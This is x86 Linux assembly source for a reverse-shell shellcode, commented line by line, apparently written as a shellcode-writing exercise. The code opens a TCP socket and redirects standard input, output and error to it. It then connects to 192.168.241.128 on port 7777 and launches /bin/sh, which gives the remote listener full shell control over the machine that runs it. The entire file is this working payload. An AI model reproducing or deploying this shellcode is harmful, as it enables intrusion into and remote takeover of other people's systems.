global _start

section .text

_start:

        xor ebx, ebx                    ; zero out ebx
        mul ebx                         ; implicit operand eax: zero out eax
        mov al, 0x66                    ; 0x66 = 102 = socketcall()
        push ebx                        ; 3rd arg: socket protocol = 0
        mov bl, 0x1                     ; ebx = 1 = socket() function
        push byte 0x1                   ; 2nd arg: socket type = 1 (SOCK_STREAM)
        push byte 0x2                   ; 1st arg: socket domain = 2 (AF_INET)
        mov ecx, esp                    ; copy stack structure's address to ecx (pointer)
        int 0x80                        ; eax = socket(AF_INET, SOCK_STREAM, 0)

	xchg eax, ebx			; ebx = socketfd, eax = 1
	pop ecx				; ecx = 2 (loop count)

dup_jump:
	mov al, 0x3f			; eax = 63 = dup2()
	int 0x80			; dup2(socketfd, ecx)
	dec ecx				; decrement ecx from stderror to stdin
	jns dup_jump			; loop until ZF is set

        mov al, 0x66                    ; 0x66 = 102 = socketcall()

	push dword 0x80f1a8c0          	; 192.168.241.128 Remote IP address
  	push word 0x611e                ; Remote port
        push word 0x0002                ; sin_family = 2 (AF_INET)
	mov ecx, esp			; ecx = ptr to *addr structure

	push byte 16                    ; addr_len = 16 (structure size)
	push ecx			; push ptr of args structure
	push ebx			; ebx = socketfd

        mov bl, 0x3                     ; ebx = 3 = connect()
        mov ecx, esp                    ; save esp into ecx, points to socketfd
        int 0x80                        ; eax = connect(socketfd, *addr[2, 7777, IP], 16) = 0 (on success)

	xor eax, eax
        push edx			; edx = 0x00000000
        push dword 0x68732f2f           ; push //sh
        push dword 0x6e69622f           ; push /bin (=/bin//sh)
        mov ebx, esp                    ; ebx =  ptr to /bin//sh into ebx
        push edx                        ; edx = 0x00000000
	mov edx, esp			; edx = ptr to NULL address
	push ebx                        ; pointer to /bin//sh. Stack = 0X00, /bin//sh, 0X00000000, &/bin//sh
        mov ecx, esp                    ; ecx points to argv
        mov al, 0xb
        int 0x80                        ; execve /bin/sh
